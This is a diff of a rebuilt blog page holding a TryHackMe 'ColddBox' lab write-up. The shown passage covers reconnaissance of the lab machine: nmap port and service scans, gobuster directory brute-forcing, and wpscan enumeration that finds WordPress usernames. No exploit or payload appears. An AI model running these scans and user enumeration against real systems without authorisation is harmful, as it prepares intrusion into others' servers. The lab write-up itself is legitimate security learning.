@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>ColddBox [TryHackMe] – Blog</title>
+    <title>ColddBox [TryHackMe] – Martin Kubecka | Blog</title>
     
 
 
@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1335,7 +1335,7 @@
 <meta name="author" content="Martin Kubecka">
 
 
-<meta property="og:site_name" content="Blog">
+<meta property="og:site_name" content="Martin Kubecka | Blog">
 <meta property="og:title" content="ColddBox [TryHackMe]">
 <meta property="og:url" content="https://martinkubecka.github.io/posts/thm/colddbox/">
 <meta property="og:type" content="article">
@@ -1345,12 +1345,12 @@
     <meta property="og:image" content="https://martinkubecka.github.io/images/thm/colddbox/icon.png">
     <meta property="og:image:url" content="https://martinkubecka.github.io/images/thm/colddbox/icon.png">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:app:name:iphone" content="Blog">
+    <meta name="twitter:app:name:iphone" content="Martin Kubecka | Blog">
     <meta property="twitter:title" content="ColddBox [TryHackMe]">
     <meta property="twitter:description" content="An easy level machine with multiple ways to escalate privileges.">
   
 
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.93.3" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1398,7 +1398,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Blog",
+      "name": "Martin Kubecka | Blog",
       "url": "https://martinkubecka.github.io/"
     }
   }
@@ -1690,7 +1690,7 @@
   
   <li >
     
-      <a href="https://martinkubecka.github.io/" class="capitalize">Blog</a>
+      <a href="https://martinkubecka.github.io/" class="capitalize">Martin Kubecka | Blog</a>
     
   </li>
   
@@ -1816,7 +1816,7 @@
 <h4 id="nmap">Nmap</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1828,22 +1828,22 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -v -p- <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-10 03:55 CST
-Completed SYN Stealth Scan at 04:03, 486.51s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
-Nmap scan report <span class="k">for</span> 10.10.145.98
-Host is up <span class="o">(</span>0.071s latency<span class="o">)</span>.
-Not shown: <span class="m">65533</span> closed ports
-
-PORT        STATE 	    SERVICE
-80/tcp   	open  	http
-4512/tcp 	open  	unknown
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -v -p- <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-10 03:55 CST
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 04:03, 486.51s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.145.98
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.071s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT        STATE 	    SERVICE
+</span></span><span class="line"><span class="cl">80/tcp   	open  	http
+</span></span><span class="line"><span class="cl">4512/tcp 	open  	unknown
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Now scan only found open ports <strong>80</strong> and <strong>4512</strong>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1861,23 +1861,23 @@ PORT        STATE 	    SERVICE
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -sC -p 80,4512 <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-10 04:05 CST
-Nmap scan report <span class="k">for</span> 10.10.145.98
-Host is up <span class="o">(</span>0.072s latency<span class="o">)</span>.
-
-PORT     	STATE 	SERVICE 	    VERSION
-80/tcp   	open  	http    		Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-<span class="p">|</span>_http-generator: WordPress 4.1.31
-<span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="p">|</span>_http-title: ColddBox <span class="p">|</span> One more machine
-4512/tcp 	open  	ssh     		OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f <span class="o">(</span>ED25519<span class="o">)</span>
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -sC -p 80,4512 <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-10 04:05 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.145.98
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.072s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     	STATE 	SERVICE 	    VERSION
+</span></span><span class="line"><span class="cl">80/tcp   	open  	http    		Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: WordPress 4.1.31
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: ColddBox <span class="p">|</span> One more machine
+</span></span><span class="line"><span class="cl">4512/tcp 	open  	ssh     		OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure >
   
@@ -1893,7 +1893,7 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 <h4 id="directory-brute-forcing">Directory Brute-Forcing</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1919,31 +1919,31 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gobuster dir -u http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -w /usr/share/wordlists/dirb/big.txt 
-<span class="o">===============================================================</span>
-Gobuster v3.0.1
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.145.98
-<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/big.txt
-<span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
-<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
-<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/01/10 03:56:57 Starting <span class="nv">gobuster</span>
-<span class="o">===============================================================</span>
-/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
-/hidden <span class="o">(</span>Status: 301<span class="o">)</span>
-/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
-/wp-admin <span class="o">(</span>Status: 301<span class="o">)</span>
-/wp-content <span class="o">(</span>Status: 301<span class="o">)</span>
-/wp-includes <span class="o">(</span>Status: 301<span class="o">)</span>
-<span class="o">===============================================================</span>
-2021/01/10 03:59:37 <span class="nv">Finished</span>
-<span class="o">===============================================================</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -u http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -w /usr/share/wordlists/dirb/big.txt 
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.0.1
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.145.98
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/big.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/10 03:56:57 Starting <span class="nv">gobuster</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/hidden <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/wp-admin <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/wp-content <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/wp-includes <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/10 03:59:37 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure >
   
@@ -1960,7 +1960,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <h4 id="wordpress-enumeration">Wordpress Enumeration</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -2081,148 +2081,146 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 </span><span class="lnt">119
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">wpscan --url http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -e
-
-<span class="o">[</span>i<span class="o">]</span> Updating the Database ...
-<span class="o">[</span>i<span class="o">]</span> Update completed.
-
-<span class="o">[</span>+<span class="o">]</span> URL: http://10.10.145.98/ <span class="o">[</span>10.10.145.98<span class="o">]</span>
-<span class="o">[</span>+<span class="o">]</span> Started: Sun Jan <span class="m">10</span> 04:07:51 <span class="m">2021</span>
-
-Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
-
-<span class="o">[</span>+<span class="o">]</span> Headers
- <span class="p">|</span> Interesting Entry: Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
- <span class="p">|</span> Found By: Headers <span class="o">(</span>Passive Detection<span class="o">)</span>
- <span class="p">|</span> Confidence: 100%
-
-<span class="o">[</span>+<span class="o">]</span> XML-RPC seems to be enabled: http://10.10.145.98/xmlrpc.php
- <span class="p">|</span> Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
- <span class="p">|</span> Confidence: 100%
- <span class="p">|</span> References:
- <span class="p">|</span>  - http://codex.wordpress.org/XML-RPC_Pingback_API
- <span class="p">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
- <span class="p">|</span>  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
- <span class="p">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
- <span class="p">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
-
-<span class="o">[</span>+<span class="o">]</span> WordPress readme found: http://10.10.145.98/readme.html
- <span class="p">|</span> Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
- <span class="p">|</span> Confidence: 100%
-
-<span class="o">[</span>+<span class="o">]</span> The external WP-Cron seems to be enabled: http://10.10.145.98/wp-cron.php
- <span class="p">|</span> Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
- <span class="p">|</span> Confidence: 60%
- <span class="p">|</span> References:
- <span class="p">|</span>  - https://www.iplocation.net/defend-wordpress-from-ddos
- <span class="p">|</span>  - https://github.com/wpscanteam/wpscan/issues/1299
-
-<span class="o">[</span>+<span class="o">]</span> WordPress version 4.1.31 identified <span class="o">(</span>Insecure, released on 2020-06-10<span class="o">)</span>.
- <span class="p">|</span> Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
- <span class="p">|</span>  - http://10.10.145.98/?feed<span class="o">=</span>rss2, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>4.1.31&lt;/generator&gt;
- <span class="p">|</span>  - http://10.10.145.98/?feed<span class="o">=</span>comments-rss2, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>4.1.31&lt;/generator&gt;
-
-<span class="o">[</span>+<span class="o">]</span> WordPress theme in use: twentyfifteen
- <span class="p">|</span> Location: http://10.10.145.98/wp-content/themes/twentyfifteen/
- <span class="p">|</span> Last Updated: 2020-12-09T00:00:00.000Z
- <span class="p">|</span> Readme: http://10.10.145.98/wp-content/themes/twentyfifteen/readme.txt
- <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is 2.8
- <span class="p">|</span> Style URL: http://10.10.145.98/wp-content/themes/twentyfifteen/style.css?ver<span class="o">=</span>4.1.31
- <span class="p">|</span> Style Name: Twenty Fifteen
- <span class="p">|</span> Style URI: https://wordpress.org/themes/twentyfifteen
- <span class="p">|</span> Description: Our <span class="m">2015</span> default theme is clean, blog-focused, and designed <span class="k">for</span> clarity. 
- <span class="p">|</span> Author: the WordPress team
- <span class="p">|</span> Author URI: https://wordpress.org/
- <span class="p">|</span>
- <span class="p">|</span> Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
- <span class="p">|</span>
- <span class="p">|</span> Version: 1.0 <span class="o">(</span>80% confidence<span class="o">)</span>
- <span class="p">|</span> Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
- <span class="p">|</span>  - http://10.10.145.98/wp-content/themes/twentyfifteen/style.css?ver<span class="o">=</span>4.1.31, Match: <span class="s1">&#39;Version: 1.0&#39;</span>
-
-<span class="o">[</span>+<span class="o">]</span> Enumerating Vulnerable Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>
-
-<span class="o">[</span>i<span class="o">]</span> No plugins Found.
-
-<span class="o">[</span>+<span class="o">]</span> Enumerating Vulnerable Themes <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
- Checking Known Locations - Time: 00:00:05 &lt;<span class="o">======================================</span>&gt; <span class="o">(</span><span class="m">330</span> / 330<span class="o">)</span> 100.00% Time: 00:00:05
-<span class="o">[</span>+<span class="o">]</span> Checking Theme Versions <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
-
-<span class="o">[</span>i<span class="o">]</span> No themes Found.
-
-<span class="o">[</span>+<span class="o">]</span> Enumerating Timthumbs <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
- Checking Known Locations - Time: 00:00:40 &lt;<span class="o">====================================</span>&gt; <span class="o">(</span><span class="m">2575</span> / 2575<span class="o">)</span> 100.00% Time: 00:00:40
-
-<span class="o">[</span>i<span class="o">]</span> No Timthumbs Found.
-
-<span class="o">[</span>+<span class="o">]</span> Enumerating Config Backups <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
- Checking Config Backups - Time: 00:00:00 &lt;<span class="o">=========================================</span>&gt; <span class="o">(</span><span class="m">22</span> / 22<span class="o">)</span> 100.00% Time: 00:00:00
-
-<span class="o">[</span>i<span class="o">]</span> No Config Backups Found.
-
-<span class="o">[</span>+<span class="o">]</span> Enumerating DB Exports <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
- Checking DB Exports - Time: 00:00:00 &lt;<span class="o">=============================================</span>&gt; <span class="o">(</span><span class="m">36</span> / 36<span class="o">)</span> 100.00% Time: 00:00:00
-
-<span class="o">[</span>i<span class="o">]</span> No DB Exports Found.
-
-<span class="o">[</span>+<span class="o">]</span> Enumerating Medias <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span> <span class="o">(</span>Permalink setting must be <span class="nb">set</span> to <span class="s2">&#34;Plain&#34;</span> <span class="k">for</span> those to be detected<span class="o">)</span>
- Brute Forcing Attachment IDs - Time: 00:00:02 &lt;<span class="o">==================================</span>&gt; <span class="o">(</span><span class="m">100</span> / 100<span class="o">)</span> 100.00% Time: 00:00:02
-
-<span class="o">[</span>i<span class="o">]</span> No Medias Found.
-
-<span class="o">[</span>+<span class="o">]</span> Enumerating Users <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
- Brute Forcing Author IDs - Time: 00:00:00 &lt;<span class="o">========================================</span>&gt; <span class="o">(</span><span class="m">10</span> / 10<span class="o">)</span> 100.00% Time: 00:00:00
-
-<span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:
-
-<span class="o">[</span>+<span class="o">]</span> the cold in person
- <span class="p">|</span> Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
-
-<span class="o">[</span>+<span class="o">]</span> c0ldd
- <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
- <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
-
-<span class="o">[</span>+<span class="o">]</span> hugo
- <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
- <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
-
-<span class="o">[</span>+<span class="o">]</span> philip
- <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
- <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
-
-<span class="o">[</span>!<span class="o">]</span> No WPVulnDB API Token given, as a result vulnerability data has not been output.
-<span class="o">[</span>!<span class="o">]</span> You can get a free API token with <span class="m">50</span> daily requests by registering at https://wpscan.com/register
-
-<span class="o">[</span>+<span class="o">]</span> Finished: Sun Jan <span class="m">10</span> 04:08:52 <span class="m">2021</span>
-<span class="o">[</span>+<span class="o">]</span> Requests Done: <span class="m">3136</span>
-<span class="o">[</span>+<span class="o">]</span> Cached Requests: <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Data Sent: 781.452 KB
-<span class="o">[</span>+<span class="o">]</span> Data Received: 16.528 MB
-<span class="o">[</span>+<span class="o">]</span> Memory used: 238.738 MB
-<span class="o">[</span>+<span class="o">]</span> Elapsed time: 00:01:00
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wpscan --url http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -e
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> Updating the Database ...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> Update completed.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> URL: http://10.10.145.98/ <span class="o">[</span>10.10.145.98<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Started: Sun Jan <span class="m">10</span> 04:07:51 <span class="m">2021</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Headers
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Interesting Entry: Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Headers <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confidence: 100%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> XML-RPC seems to be enabled: http://10.10.145.98/xmlrpc.php
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confidence: 100%
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> WordPress readme found: http://10.10.145.98/readme.html
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confidence: 100%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The external WP-Cron seems to be enabled: http://10.10.145.98/wp-cron.php
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confidence: 60%
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - https://github.com/wpscanteam/wpscan/issues/1299
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> WordPress version 4.1.31 identified <span class="o">(</span>Insecure, released on 2020-06-10<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://10.10.145.98/?feed<span class="o">=</span>rss2, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>4.1.31&lt;/generator&gt;
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://10.10.145.98/?feed<span class="o">=</span>comments-rss2, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>4.1.31&lt;/generator&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> WordPress theme in use: twentyfifteen
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Location: http://10.10.145.98/wp-content/themes/twentyfifteen/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Last Updated: 2020-12-09T00:00:00.000Z
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Readme: http://10.10.145.98/wp-content/themes/twentyfifteen/readme.txt
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is 2.8
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Style URL: http://10.10.145.98/wp-content/themes/twentyfifteen/style.css?ver<span class="o">=</span>4.1.31
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Style Name: Twenty Fifteen
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Style URI: https://wordpress.org/themes/twentyfifteen
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Description: Our <span class="m">2015</span> default theme is clean, blog-focused, and designed <span class="k">for</span> clarity. 
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Author: the WordPress team
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Author URI: https://wordpress.org/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Version: 1.0 <span class="o">(</span>80% confidence<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://10.10.145.98/wp-content/themes/twentyfifteen/style.css?ver<span class="o">=</span>4.1.31, Match: <span class="s1">&#39;Version: 1.0&#39;</span>
